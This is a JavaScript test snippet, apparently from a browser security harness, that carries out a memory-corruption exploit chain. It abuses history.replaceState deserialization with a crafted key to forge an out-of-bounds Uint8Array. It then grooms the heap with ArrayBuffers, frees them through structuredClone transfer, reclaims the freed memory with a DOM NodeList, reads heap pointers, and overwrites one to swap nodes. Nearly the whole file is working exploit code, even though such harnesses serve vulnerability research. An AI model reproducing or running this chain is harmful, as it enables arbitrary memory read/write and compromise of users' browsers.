// Free neighboring fixed buffers before the target slot to permit vector growth.
function makeKey() {
  var bytes = [0, 0, 0, 0x16, 0x02, 8];
  for (var i = 1; i < 8; i++) bytes.push(0);
  bytes.push(0xf8);
  for (var j = 1; j < 8; j++) bytes.push(0xff);
  bytes.push(0x13, 3, 0, 0xff, 0xff, 0xff, 0xff);
  var chars = [];
  for (var k = 0; k < bytes.length; k += 2)
    chars.push(String.fromCharCode(bytes[k] | (bytes[k + 1] << 8)));
  return (chars.join("") + "A".repeat(256)).slice(0, 256);
}
function mark(name) {
  if (api && typeof api.markSync === "function") api.markSync(name);
}
var phase = "build";
var result;
try {
  var backing = new ArrayBuffer(8, { maxByteLength: 16 });
  new Uint8Array(backing).fill(0x41);
  var fixed = new ArrayBuffer(66224);
  new Uint8Array(fixed).fill(0x91);
  var filler = new Array(253);
  filler[0] = BigInt(1) << BigInt(40);
  filler[1] = backing;
  filler[2] = fixed;
  for (var extra = 3; extra < 6; extra++) {
    var fixedNeighbor = new ArrayBuffer(66224);
    new Uint8Array(fixedNeighbor).fill(0x91 + extra - 2);
    filler[extra] = fixedNeighbor;
  }
  for (var i = 6; i < 27; i++) {
    var neighbor = new ArrayBuffer(8, { maxByteLength: 16 });
    new Uint8Array(neighbor).fill(0x40 + i);
    filler[i] = neighbor;
  }
  for (var j = 27; j < filler.length; j++) filler[j] = {};
  var shared = { marker: 0x51515151 };
  var input = { filler: filler, first: shared, second: shared };
  input[makeKey()] = 0;
  phase = "store";
  history.replaceState(input, "");
  mark("node_slot_stored");
  phase = "load";
  var output = history.state;
  mark("node_slot_loaded");
  var target = output.filler[1];
  var synthetic = output["\u0000"];
  var cloned = new Uint8Array(output.filler[2]);
  var valid = synthetic instanceof Uint8Array && synthetic.buffer === target &&
    synthetic.byteOffset === 8 && synthetic.length > 1e12 &&
    target.byteLength === 8 && cloned.length === 66224;
  var regionLength = 262144;
  var first = -1;
  var changes = 0;
  var before = null;
  var sampled = [];
  var pointerCandidate = false;
  var swappedToSecond = null;
  var restoredToFirst = null;
  var readbackMatchesSecond = null;
  var duplicateIndex = -1;
  var oldLength = null;
  var listLength = null;
  if (valid) {
    phase = "locate";
    var baseline = new Uint8Array(regionLength);
    for (var k = 0; k < regionLength; k++) baseline[k] = synthetic[k];
    cloned.fill(0xc4);
    for (var a = 0; a < regionLength; a++) {
      if (synthetic[a] !== baseline[a]) {
        changes++;
        if (first < 0) first = a;
      }
    }
    if (first >= 0 && first + 66224 > regionLength) {
      for (var tail = regionLength; tail < first + 66224; tail++)
        if (synthetic[tail] === 0xc4) changes++;
    }
    cloned.fill(0x91);
    mark("node_slot_located");
    if (changes === 66224 && first >= 0 &&
        synthetic[first] === 0x91 && synthetic[first + 66223] === 0x91) {
      phase = "build_dom_before_release";
      var root = document.createElement("div");
      var fragment = document.createDocumentFragment();
      for (var d = 0; d < 8192; d++)
        fragment.appendChild(document.createElement("span"));
      root.appendChild(fragment);
      mark("node_slot_dom_ready");
      phase = "transfer";
      before = synthetic[first];
      for (var released = 3; released < 6; released++)
        structuredClone(0, { transfer: [output.filler[released]] });
      structuredClone(0, { transfer: [output.filler[2]] });
      oldLength = cloned.length;
      mark("node_slot_detached");
      phase = "query_node_list";
      var list = root.querySelectorAll("span");
      listLength = list.length;
      var firstNode = list.item(0);
      var secondNode = list.item(1);
      var nodesDistinct = firstNode !== secondNode;
      mark("node_slot_list_ready");
      phase = "read_slot";
      for (var t = 0; t < 32; t++) sampled.push(synthetic[first + t]);
      mark("node_slot_read_done");
      function low32(start) {
        return (sampled[start] | sampled[start + 1] << 8 |
          sampled[start + 2] << 16 | sampled[start + 3] << 24) >>> 0;
      }
      function high32(start) {
        return (sampled[start + 4] | sampled[start + 5] << 8 |
          sampled[start + 6] << 16 | sampled[start + 7] << 24) >>> 0;
      }
      var lows = [low32(0), low32(8), low32(16), low32(24)];
      var highs = [high32(0), high32(8), high32(16), high32(24)];
      pointerCandidate = nodesDistinct && highs[0] > 0 && highs[0] < 0x100000 &&
        highs.every(function(value) { return value === highs[0]; }) &&
        lows.every(function(value) { return value !== 0 && (value & 15) === 0; }) &&
        lows[1] > lows[0] && lows[1] - lows[0] < 0x10000 &&
        lows[2] > lows[1] && lows[2] - lows[1] < 0x10000 &&
        lows[3] > lows[2] && lows[3] - lows[2] < 0x10000;
      if (pointerCandidate) {
        phase = "swap_valid_nodes";
        try {
          for (var w = 0; w < 8; w++) synthetic[first + w] = sampled[8 + w];
          readbackMatchesSecond = true;
          for (var r = 0; r < 8; r++)
            if (synthetic[first + r] !== sampled[8 + r]) readbackMatchesSecond = false;
          swappedToSecond = list.item(0) === secondNode;
          for (var listIndex = 0; listIndex + 1 < listLength; listIndex++) {
            if (list.item(listIndex) === list.item(listIndex + 1)) {
              duplicateIndex = listIndex;
              break;
            }
          }
        } finally {
          for (var x = 0; x < 8; x++) synthetic[first + x] = sampled[x];
        }
        restoredToFirst = list.item(0) === firstNode;
        mark("node_slot_swap_restored");
      }
    }
  }
  var expected = valid && changes === 66224 && before === 0x91 &&
    oldLength === 0 && listLength === 8192 && sampled.length === 32;
  result = { id: "node_list_groomed_release", status: expected ? "pass" : "fail", details: {
    view_valid: valid, first_index: first, changed_bytes: changes,
    before: before, old_length: oldLength, node_list_length: listLength,
    sampled: sampled.join(","), pointer_candidate: pointerCandidate,
    swapped_to_second: swappedToSecond, restored_to_first: restoredToFirst,
    duplicate_index: duplicateIndex, readback_matches_second: readbackMatchesSecond
  } };
} catch (error) {
  result = { id: "node_list_groomed_release", status: "error", details: {
    phase: phase, error: String(error).slice(0, 200)
  } };
}
try { history.replaceState(null, ""); }
catch (error) { result.status = "error"; result.details.cleanup_error = String(error).slice(0, 100); }
return [result];
